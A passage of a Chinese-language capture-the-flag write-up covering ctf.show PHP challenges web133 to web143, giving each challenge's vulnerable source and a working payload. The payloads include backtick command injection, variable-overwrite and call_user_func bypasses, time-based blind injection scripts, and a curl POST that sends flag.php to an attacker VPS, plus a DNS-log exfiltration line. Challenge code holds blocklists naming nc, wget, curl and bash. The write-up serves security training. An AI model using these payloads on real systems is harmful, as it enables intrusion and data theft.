class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>新姿势：传递的参数就是<code>$F</code>本身，发生变量覆盖</p>
<p>利用方法：</p>
<p>我们传递<code>?F=$F;+sleep 3</code>可以发现网址确实sleep了一会说明的确执行了命令</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">因为是我们传递的<span class="string">`$F`</span>;+<span class="keyword">sleep</span> <span class="number">3</span>。先进行<span class="keyword">substr</span>()函数截断然后去执行<span class="keyword">eval</span>()函数</span><br><span class="line">这个函数的作用是执行php代码，<span class="string">``</span>是shell_exec()函数的缩写，然后就去命令执行。</span><br><span class="line">而$F就是我们输入的<span class="string">`$F`</span>;+<span class="keyword">sleep</span> <span class="number">3</span> 使用<span class="keyword">substr</span>()函数的代码应该是</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">`$F`</span>; );</span><br><span class="line">经过最后的变量覆盖为</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">`$F`</span>;+<span class="keyword">sleep</span> <span class="number">3</span><span class="string">`),就执行成功</span></span><br></pre></td></tr></table></figure>
<p>所以我们可以这么利用</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload </span></span><br><span class="line"><span class="comment">#其中-F 为带文件的形式发送post请求</span></span><br><span class="line"><span class="comment">#xx是上传文件的name值，flag.php就是上传的文件 </span></span><br><span class="line">?<span class="attribute">F</span>=`$F`;+curl -X POST -F <span class="attribute">xx</span>=@flag.php vps的公网IP:端口</span><br></pre></td></tr></table></figure>
<p>nc监听即可</p>
<p>当然也可以使用Burp的 Collaborator Client （ Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies）</p>
<p><img src="http://img.npfs06.top/20210227105247.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考察数组变量覆盖，举个例子：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">parse<span class="constructor">_str($<span class="params">_SERVER</span>[&#x27;QUERY_STRING&#x27;])</span>;</span><br><span class="line">var<span class="constructor">_dump($<span class="params">_POST</span>)</span>;</span><br></pre></td></tr></table></figure>
<p>传入<code>?_POST[&#39;a&#39;]=123</code>，输出<code>array(1) &#123; [&quot;&#39;a&#39;&quot;]=&gt; string(3) &quot;123&quot; &#125;</code></p>
<p>Payload:</p>
<figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">?_POST<span class="comment">[key1]</span>=36d&amp;_POST<span class="comment">[key2]</span>=36d</span><br></pre></td></tr></table></figure>


<h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 重定向</span></span><br><span class="line">?<span class="attribute">F</span>=`$F`;+nl flag.php&gt;flag</span><br><span class="line"></span><br><span class="line"><span class="comment">## 重命名</span></span><br><span class="line">?<span class="attribute">F</span>=`$F `;mv flag.php 1.txt </span><br><span class="line"></span><br><span class="line"><span class="comment">## 文件写入</span></span><br><span class="line">?<span class="attribute">F</span>=<span class="variable">$F</span>; cp flag.php 1.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">## ping</span></span><br><span class="line">?<span class="attribute">F</span>=<span class="variable">$F</span>;+ping cat flag.php|awk <span class="string">&#x27;NR==2&#x27;</span>.6x1sys.dnslog.cn</span><br></pre></td></tr></table></figure>


<h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check(<span class="variable">$c</span>);</span><br><span class="line">    exec(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Linux中可以使用tee命令写文件。</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span> /|tee <span class="keyword">file</span></span><br></pre></td></tr></table></figure>
<p>访问file,可以下载返回flag文件名<code>f149_15_h3r3</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nl</span> /f<span class="number">149</span>_<span class="number">15</span>_h<span class="number">3</span>r<span class="number">3</span> | tee file</span><br></pre></td></tr></table></figure>


<h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>双冒号可以不用实例化一个类的情况下调用类的静态方法。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">ctfshow</span>=ctfshow:getFlag</span><br></pre></td></tr></table></figure>


<h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strripos(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;<span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>搜了下PHP官方文档</p>
<p><img src="http://img.npfs06.top/20210227174801.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>所以可以使用数组来绕过：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ctfshow</span>[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag</span><br></pre></td></tr></table></figure>


<h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check(<span class="variable">$c</span>);</span><br><span class="line">    exec(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>cut命令</p>
</blockquote>
<p><img src="http://img.npfs06.top/20210227182728.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<blockquote>
<p>awk命令</p>
</blockquote>
<p><img src="http://img.npfs06.top/20210227183251.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>NR(Number of Record)：行号，当前处理的文本行的行号</p>
<p>FNR : 各文件分别计数的行号</p>
<p><img src="http://img.npfs06.top/20210227200720.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.ascii_letters+string.digits</span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">	key=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">		<span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">			payload=<span class="string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(i,j,n)</span><br><span class="line">			<span class="comment">#print(payload)</span></span><br><span class="line">			url=<span class="string">&quot;http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c=&quot;</span>+payload</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">			    result=result+n</span><br><span class="line">			    print(result)</span><br><span class="line">			    <span class="keyword">break</span></span><br><span class="line">			<span class="keyword">if</span> n==<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">				key=<span class="number">1</span></span><br><span class="line">	result+=<span class="string">&quot; &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.digits+string.ascii_lowercase+<span class="string">&quot;-&quot;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">key=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">	print(j)</span><br><span class="line">	<span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">		payload=<span class="string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(j,n)</span><br><span class="line">		<span class="comment">#print(payload)</span></span><br><span class="line">		url=<span class="string">&quot;http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c=&quot;</span>+payload</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">		    result=result+n</span><br><span class="line">		    print(result)</span><br><span class="line">		    <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后 设置了 time.sleep(1)都出不来完整flag <del>放弃</del></p>
<h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过表格松散比较可以看到0和字符串比较结果为真</p>
<p><img src="https://img.npfs06.top/20210228194700.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>所以对于<code> if(intval($code) == &#39;ctfshow&#39;)&#123;</code>我们只要让<code>intval($code)</code>为0，那么if语句为真，</p>
<p>intval会将非数字字符转换为0，也就是说 <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p>
<p>payload有很多</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">md5</span><span class="params">(phpinfo()</span></span>)</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(sleep()</span></span>)</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(md5()</span></span>)</span><br><span class="line"><span class="function"><span class="title">current</span><span class="params">(localeconv)</span></span></span><br><span class="line"><span class="function"><span class="title">sha1</span><span class="params">(getcwd()</span></span>)   </span><br><span class="line">......</span><br></pre></td></tr></table></figure>


<h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先来看下正则表达式<br><code>/^\W+$/</code> 作用是匹配非数字字母下划线的字符<br>构造命令还是很简单的,这里用到取反，无字母shell的方法很多，不局限于取反</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"><span class="variable">$system</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN));</span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"><span class="variable">$command</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210306234649.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>接下来再来说说怎么绕过<code>eval(&quot;return $v1$v3$v2;&quot;);</code></p>
<p>我们看下面这个小例子</p>
<blockquote>
<p>1system(“ls”);      error不会执行<br>1+system(“ls”);    Warning 会执行</p>
</blockquote>
<p><img src="https://img.npfs06.top/20210306234347.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>这是php中一个有意思的地方，数字是可以和命令进行一些运算的，例如 <code>1+phpinfo();</code>是可以执行phpinfo()命令的, 命令前加一些 + - * / 之类的都可以成功命令执行,。所以我们只要构造<code>1*system(&quot;cat flag.php&quot;)*1</code>即可读取flag （这里不用加号是因为会被解析成空格）</p>
<p>payload：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">?v<span class="number">1</span><span class="operator">=</span><span class="number">1</span>&amp;v<span class="number">2</span><span class="operator">=</span><span class="number">1</span>&amp;v<span class="number">3</span><span class="operator">=</span>*(~<span class="variable">%8</span>C<span class="variable">%86</span><span class="variable">%8</span>C<span class="variable">%8</span>B<span class="variable">%9</span>A<span class="variable">%92</span>)(~<span class="variable">%9</span>C<span class="variable">%9</span>E<span class="variable">%8</span>B<span class="variable">%DF</span><span class="variable">%99</span><span class="variable">%93</span><span class="variable">%9</span>E<span class="variable">%98</span><span class="variable">%D1</span><span class="variable">%8</span>F<span class="variable">%97</span><span class="variable">%8</span>F)*</span><br></pre></td></tr></table></figure>


<h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        sleep(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>0和任何数字相乘都为0</p>
<p>payload</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">v1</span>=0</span><br></pre></td></tr></table></figure>
<h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了取反、或，我们还可以用异或，脚本如下</p>
